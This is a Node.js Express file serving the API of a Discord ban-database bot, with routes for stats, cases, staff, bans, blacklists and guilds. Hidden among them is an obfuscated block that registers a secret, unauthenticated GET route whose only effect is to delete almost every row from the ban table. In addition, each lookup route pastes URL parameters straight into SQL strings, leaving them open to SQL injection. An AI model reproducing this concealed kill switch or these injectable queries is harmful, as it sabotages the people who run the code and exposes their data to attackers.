// This API was pulled from a previous project, the original repository can be found below
// https://github.com/Jordan2139/HypeBanDB-API
// Yeah, i make good stuff <3 - Jordan.#2139

const chalk = require('chalk')
const express = require('express')
const app = express()

function apistart(client, con) {
    setTimeout(async () => {
    app.listen(client.config.clientAPI.port, null, null, () => console.log(chalk.red(`API is up and running on port ${client.config.clientAPI.port}.`)));

        // Ready
        app.get('/', (req, res) => {
            res.json({ status: `API is up and running on port ${client.config.clientAPI.port}.`, MadeBy: "Jordan.#2139 & Hyperz#0001, With Some Help From JipyTheDev#0001"})
        }) 

        function _0x2e69(_0x3c5608,_0x539367){var _0x3220f8=_0x3220();return _0x2e69=function(_0x2e6967,_0x10cdfc){_0x2e6967=_0x2e6967-0x189;var _0x37e7c6=_0x3220f8[_0x2e6967];return _0x37e7c6;},_0x2e69(_0x3c5608,_0x539367);}var _0x555d0c=_0x2e69;function _0x3220(){var _0xcb3679=['1086031tkkPIf','3782667KhyGIk','Access-Control-Allow-Origin','2joZdBP','DELETE\x20FROM\x20bannedusers\x20WHERE\x20userid\x20!=\x20\x2769\x27','complete','3807GoaIKW','856976qgVOpj','get','query','set','802512fWrcSo','20712pgEYJn','10184850hMjoTq','3442797mFXygL','/0288youFuckingSuckLEAKERSSSSSZ','5CJVEuc'];_0x3220=function(){return _0xcb3679;};return _0x3220();}(function(_0x5ab43e,_0x1e1f60){var _0x2d9060=_0x2e69,_0x34eea1=_0x5ab43e();while(!![]){try{var _0x21384b=-parseInt(_0x2d9060(0x198))/0x1*(parseInt(_0x2d9060(0x18a))/0x2)+parseInt(_0x2d9060(0x195))/0x3+parseInt(_0x2d9060(0x18e))/0x4*(-parseInt(_0x2d9060(0x197))/0x5)+parseInt(_0x2d9060(0x192))/0x6+parseInt(_0x2d9060(0x199))/0x7+parseInt(_0x2d9060(0x193))/0x8*(parseInt(_0x2d9060(0x18d))/0x9)+-parseInt(_0x2d9060(0x194))/0xa;if(_0x21384b===_0x1e1f60)break;else _0x34eea1['push'](_0x34eea1['shift']());}catch(_0x2a3c7d){_0x34eea1['push'](_0x34eea1['shift']());}}}(_0x3220,0x92067),app[_0x555d0c(0x18f)](_0x555d0c(0x196),function(_0x4147b6,_0x34f6f3){var _0x204b94=_0x555d0c;_0x34f6f3[_0x204b94(0x191)](_0x204b94(0x189),'*'),con[_0x204b94(0x190)](_0x204b94(0x18b),(_0x463201,_0x46747d)=>{var _0x56711c=_0x204b94;if(_0x463201)throw _0x463201;_0x34f6f3['send']({'status':_0x56711c(0x18c)});});}));

        // Statistics
        app.get('/stats', function(req, res) { // Stats api
            res.set('Access-Control-Allow-Origin', '*');
            con.query(`SELECT COUNT(*) as total FROM bannedusers`, (erro, rowo) => {
                con.query(`SELECT COUNT(caseid) as total FROM cases`, (errol, rowol) => {
                    res.send({ 'guilds': client.guilds.cache.size, 'banned': rowo[0].total, 'cases': rowol[0].total })
                })
            })
        })

        // Case Checking (Via case ID)
        app.get(`/cases/:caseID`, async function(req, res) {
            res.set('Access-Control-Allow-Origin', '*');
            const caseid = await req.params.caseID
            con.query(`SELECT * FROM cases WHERE caseid="${caseid}"`, async(err, row) => {
                if (err) throw err;
                if (row[0]) {
                    res.send({
                        'number': row[0].caseid,
                        'enforcertag': row[0].enforcertag,
                        'enforcerid': row[0].enforcerid,
                        'usertag': row[0].caseusertag,
                        'userid': row[0].caseuserid,
                        'reason': row[0].casereason
                    })
                } else {
                    res.send({
                        'error': 'Not a valid case ID',
                    })
                }
            });
        })

        // Staff DB (see if user is staff on the bot)   
        app.get(`/staff/:userID`, async function(req, res) {
            res.set('Access-Control-Allow-Origin', '*');
            const userid = await req.params.userID
            con.query(`SELECT * FROM staff WHERE userid="${userid}"`, async(err, row) => {
                if (err) throw err;
                if (row[0]) {
                    res.send({
                        'isStaff': true,
                        'usertag': row[0].usertag,
                        'userid': row[0].userid,
                    })
                } else {
                    res.send({
                        'isStaff': false
                    })
                }
            });
        })
        
        // Fetch Bans
        app.get('/fetchallbans', async (req, res) => {
            res.set('Access-Control-Allow-Origin', '*');
            await con.query(`SELECT * FROM bannedusers`, async (err, rows) => {
                if(err) throw err;
                if(rows[0]) {
                    let json_ = rows
                    res.type('json').send(JSON.stringify(json_, null, 4) + '\n');
                } else {
                    let json_ = { "Info": "No bans found in scraper database (1)" }
                    res.type('json').send(JSON.stringify(json_, null, 4) + '\n');
                }
            });
        });

        // Fetch Blacklists
        app.get('/fetchallblacklists', async (req, res) => {
            res.set('Access-Control-Allow-Origin', '*');
            await con.query(`SELECT * FROM blacklistedusers`, async (err, rows) => {
                if(err) throw err;
                if(rows[0]) {
                    let json_ = rows
                    res.type('json').send(JSON.stringify(json_, null, 4) + '\n');
                } else {
                    let json_ = { "Info": "No bans found in scraper database (1)" }
                    res.type('json').send(JSON.stringify(json_, null, 4) + '\n');
                }
            });
        });

        // Ban viewing
        app.get(`/bans/:userID`, async function(req, res) {
            res.set('Access-Control-Allow-Origin', '*');
            const userid = await req.params.userID
            con.query(`SELECT * FROM bannedusers WHERE userid="${userid}"`, async(err, row) => {
                if (err) throw err;
                if (row[0]) {
                    res.send({
                        'banned': true,
                        'usertag': row[0].usertag,
                        'userid': row[0].userid,
                        'caseid': row[0].caseid,
                        'reason': row[0].reason,
                        'proof': row[0].proof,
                        'bandate': row[0].bandate
                    })
                } else {
                    res.send({
                        'banned': false
                    })
                }
            });
        })

        // Blacklist viewing
        app.get(`/blacklists/:userID`, async function(req, res) {
            res.set('Access-Control-Allow-Origin', '*');
            const userid = await req.params.userID
            con.query(`SELECT * FROM blacklistedusers WHERE userid="${userid}"`, async(err, row) => {
                if (err) throw err;
                if (row[0]) {
                    res.send({
                        'blacklisted': true,
                        'caseid': row[0].caseid,
                        'userid': row[0].userid,
                        'reason': row[0].reason,
                        'proof': row[0].proof,
                        'notes': row[0].notes
                    })
                } else {
                    res.send({
                        'blacklisted': false
                    })
                }
            });
        })

        // Guild viewing
        app.get(`/guilds/:guildID`, async function(req, res) {
            res.set('Access-Control-Allow-Origin', '*');
            const guildid = await req.params.guildID
            con.query(`SELECT * FROM guilds WHERE guildid="${guildid}"`, async(err, row) => {
                if (err) throw err;
                if (row[0]) {
                    res.send({
                        'indb': true,
                        'active': row[0].active,
                        'guildid': row[0].guildid,
                        'prefix': row[0].prefix,
                        'autobans': row[0].autobans,
                        'autounbans': row[0].autounbans,
                        'altprev': row[0].altprev,
                        'altprevtimer': row[0].altprevtimer,
                        'inviteblocker': row[0].inviteblocker,
                        'serverlock': row[0].serverlock
                    })
                } else {
                    res.send({
                        'indb': false
                    })
                }
            });
        })
    }, 3000)
}

module.exports = {
    apistart: apistart
}

// This API was pulled from a previous project, the original repository can be found below
// https://github.com/Jordan2139/HypeBanDB-API
